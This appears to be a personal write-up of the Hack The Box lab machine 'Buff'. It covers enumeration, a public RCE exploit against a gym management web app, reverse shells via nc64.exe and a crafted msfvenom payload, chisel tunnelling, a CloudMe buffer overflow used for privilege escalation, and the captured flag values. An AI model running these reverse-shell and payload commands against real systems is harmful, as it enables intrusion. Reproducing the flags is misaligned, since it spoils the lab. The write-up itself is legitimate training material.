# Enumeration
## nmap
`nmap -sC -sV -A -v 10.10.10.198 -Pn`
![[Screenshot 2022-05-05 at 15.15.56.png]]
## gobuster
`gobuster dir -u http://buff.htb:8080 -x php,txt,html,bak,zip -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error`
![[Screenshot 2022-05-05 at 16.44.06.png]]
There were loadsss of results, showing it is not a HTB created software but an actual software..
## curl
`curl -X OPTIONS http://10.10.10.198:8080 -i`
![[Screenshot 2022-05-05 at 15.17.28.png]]
![[Screenshot 2022-05-05 at 15.23.15.png]]


# Foothold
## website exploration / burp
When trying to log in with _admin:admin_ an error message pops up.
PHP
contact page:
![[Screenshot 2022-05-05 at 15.20.02.png]]
--> Looking up this software eimmediately lead me to [exploit-db](https://www.exploit-db.com/exploits/48506) which showed a RCE exploit.
# Exploit
## searchsploit
`searchsploit apache 2.4.43`
![[Screenshot 2022-05-05 at 15.29.20.png]]
Combined with the exploit-db article found, I believe its the first result that will be handy!
`searchsploit gym management system 1.0`
![[Screenshot 2022-05-05 at 15.56.19.png]]

## execution
I ran `python2 /usr/share/exploitdb/exploits/php/webapps/48506.py 'http://10.10.10.198:8080/'` and it gave a very unstable shell, but a shell nonetheless:
![[Screenshot 2022-05-05 at 16.15.59.png]]

Changing directories was not possible, but reading the user.txt file was still possible with `type \users\shaun\desktop\user.txt`

# Shell Upgrade
The unstability of the shell got old.. so I decided to upgrade it using a nc shell. Hacktricks directed me to [this nc.exe](https://github.com/int0x33/nc.exe/). Looking at the previous enumeration, I remembered the system was 64-bit, so I decided to use this.

## process
1. `git clone https://github.com/int0x33/nc.exe.git` kali
2. `python3 -m http.server 8000`in kali + `curl http://10.10.14.19:8000/nc64.exe --output nc64.exe` in windows 
3. `nc64.exe -e cmd.exe 10.10.14.19 4444` windows

![[Screenshot 2022-05-05 at 16.39.05.png]]

# Privesc
## enumeration 2
another nmap scan for more ports
Uploaded winpeas and a LOT of vulnerabilities were found:
![[Screenshot 2022-05-05 at 16.46.00.png]]. They all seemed to be part of one main privesc [Windows Elevation of Privilege Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934). At first I thought this was simply just too arbitrary of a name. But looking more into it, it appears its such a 'fundamental' privesc that it was given this name.

`whoami /all`
![[Screenshot 2022-05-07 at 12.58.46.png]]
--> _SeChangeNotifyPrivilege_ could potentially be useful.
--> The _BUILTIN\Users_ also caught my attention

`net users`
![[Screenshot 2022-05-07 at 13.05.29.png]]
--> I believe we are shaun but the _defaultacount_ could be something which systems forget to secure because they assume noone uses it.

`net localgroup`
![[Screenshot 2022-05-07 at 13.09.58.png]]


`netstat -ano | findstr TCP | findstr ":0"` to see processes being ran:
![[Screenshot 2022-05-06 at 21.00.57.png]] But I could not immediately identify anything suspicious being ran although 127.0.0.1:8888 was looking a lil sus. 

Looking through the results for `tasklist /v` the processes ran by current user was _conhost.exe_, _mysqld.exe_ and _httpd.exe_, _cmd.exe_, _conhost.exe_, _nc.exe_ and _tasklist.exe_
--> DB dump?
Looking into the other processes and programs being ran, not recognising most of them I kept inserting _taskname.exe job_ into Google, and as expected most of them are just regular Windows processes for the system to run functionally. However, _CloudMe.exe_ instantly showed a Buffer Overflow vuln. This will be the POA I think!


## try 1 - RottenPotatoes
`curl http://10.10.14.19:8000/tools/RottenPotatoNG/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe --output rotten.exe` was not runnable so unsuccessful:')

## try 2 - CloudMe.exe BoF
Checking out the [exploit-db](https://www.exploit-db.com/exploits/48389) article on the exploit, the instructions were to _start the CloudMe service and run the exploit script_. Not very helpful to me as I was not sure how to start the service..

`dir /b /s C:\*cloudme*` to find the service:
![[Screenshot 2022-05-07 at 19.32.32.png]]

### 1 = [tunnelling](https://infinitelogins.com/2020/12/11/tunneling-through-windows-machines-with-chisel/)
1. Downloaded chisel for [windows amd64](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz) and for [linux amd64](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz)
2. `gzip -d chisel_1.7.7_linux_amd64.gz` for both
3. `curl http://10.10.14.19:8000/HTB/buff/chisel_1.7.7_windows_amd64 --output chisel.exe` on target machine in _\Users\shaun\Downloads directory_
4. `./chisel_1.7.7_linux_amd64 server -p 9001 --reverse` from attacking machine
5. `chisel.exe client 10.10.14.19:9001 R:8888:127.0.0.1:8888` from _\Users\shaun\Downloads_
### 2 = generating new payload 
`msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc64.exe -e cmd.exe 10.10.14.19 9001' -b '\x00\x0A\x0D' -f py -v payload`, update the python script + set up nc listener for the port..
### 3 = executing
`python2 48389.py` and a shell was spawned:
![[Screenshot 2022-05-08 at 12.01.20.png]]
**Did not work when I tried again?**

`type \Users\Administrator\Desktop\root.txt` to get flag:)

# Flags
ddbfc9da4bef41a24d96608f956361c4
b99ddd21937b853c5a116cbb045a3cfb
# Thoughts
- ![[Screenshot 2022-05-05 at 16.47.55.png]]
- `����������͹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  BUFF
    DefaultUserName               :  Administrator`
- xampp+httpd.exe --> `C:\xampp\apache\bin\httpd.exe`
 - `C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml`
 - awk.exe
 - --> next = go through all the CVE's + check which can be exploited. 
# New Things Learnt
- more windows privesc enumeration
- always check sessions/processes running and local connections
- tunneling!
- The CVE's suggested by win/linPeas is normally not the way to go --> too vague and not the purpose of the machines.
- msfvenom payloads can only be excuted once?

![[Screenshot 2022-05-05 at 16.55.22.png]]![[Screenshot 2022-05-05 at 16.56.17.png]]![[Screenshot 2022-05-05 at 16.57.07.png]]![[Screenshot 2022-05-05 at 16.57.56.png]]


### writeups
- https://0xdf.gitlab.io/2020/11/21/htb-buff.html
- [winner](https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-buff/)
- [diff shell approach using smb](https://infosecwriteups.com/htb-buff-writeup-5d118ab695c0)